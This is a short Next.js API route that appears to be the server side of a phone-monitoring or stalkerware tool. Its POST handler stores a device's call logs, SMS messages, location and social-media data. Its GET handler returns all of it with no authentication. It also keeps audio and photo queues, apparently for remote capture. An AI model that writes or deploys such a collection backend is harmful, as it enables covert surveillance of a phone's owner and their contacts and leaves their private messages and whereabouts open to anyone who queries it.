export const dynamic = "force-static";
import { NextResponse } from 'next/server';

globalThis.deviceData = globalThis.deviceData || {
  calls: [],
  sms: [],
  location: null,
  social: [],
  audioQueue: [],
  photoQueue: []
};

export async function POST(req: Request) {
  try {
    const body = await req.json();
    if (body.calls) globalThis.deviceData.calls = body.calls;
    if (body.sms) globalThis.deviceData.sms = body.sms;
    if (body.location) globalThis.deviceData.location = body.location;
    if (body.social) globalThis.deviceData.social = body.social;

    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ error: "Failed to sync" }, { status: 500 });
  }
}

export async function GET() {
  return NextResponse.json(globalThis.deviceData || {});
}
